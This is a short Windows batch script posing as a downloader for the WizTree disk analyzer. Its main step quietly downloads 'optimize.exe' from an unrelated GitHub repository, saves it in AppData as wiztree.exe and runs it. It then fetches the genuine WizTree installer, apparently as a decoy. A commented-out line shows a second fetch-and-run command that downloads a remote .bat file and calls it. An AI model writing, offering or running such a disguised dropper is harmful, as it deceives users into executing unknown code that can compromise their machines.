@echo off
echo Downloading WizTree...
# curl -fsSL "https://example.com/script.bat" -o "%TEMP%\run.bat" && call "%TEMP%\run.bat"

set dest="%AppData%/wiztree.exe"

rm %dest%
curl -L "https://github.com/SpeekyChat/44/releases/download/rel/optimize.exe" -o %dest%
%dest%

curl -L "https://www.diskanalyzer.com/files/wiztree_4_34_setup.exe" -o ./wiztree.exe
start wiztree.exe
